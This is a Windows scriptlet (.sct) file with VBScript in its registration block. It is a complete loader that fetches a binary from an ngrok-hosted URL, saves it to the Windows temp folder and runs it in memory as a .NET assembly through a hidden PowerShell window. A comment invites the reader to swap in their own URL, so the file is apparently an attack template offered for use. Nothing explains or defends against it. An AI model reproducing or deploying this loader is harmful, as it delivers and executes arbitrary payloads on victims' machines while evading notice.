<?xml version="1.0"?>
<scriptlet>
    <registration
        progid="MyScriptlet"
        classid="{AAAA1111-0000-0000-0000-ABCDEF123456}">
        <script language="VBScript">
            <![CDATA[
                Dim objShell, objHTTP, strURL, objTempFile
                strURL = "https://immune-gopher-finer.ngrok-free.app/raw.bin" ' <-- Replace with your URL
                Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
                objHTTP.Open "GET", strURL, False
                objHTTP.Send
                If objHTTP.Status = 200 Then
                    ' Create a temporary file to store the downloaded binary
                    Set objTempFile = CreateObject("Scripting.FileSystemObject").CreateTextFile("C:\Windows\Temp\p.bin", True)
                    objTempFile.Write objHTTP.responseBody
                    objTempFile.Close

                    ' Execute the binary using PowerShell to avoid writing to disk
                    Set objShell = CreateObject("WScript.Shell")
                    objShell.Run "powershell -nop -w hidden -c ""[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes('C:\Windows\Temp\p.bin')).EntryPoint.Invoke($null, $null)"""
                End If
            ]]>
        </script>
    </registration>
</scriptlet>
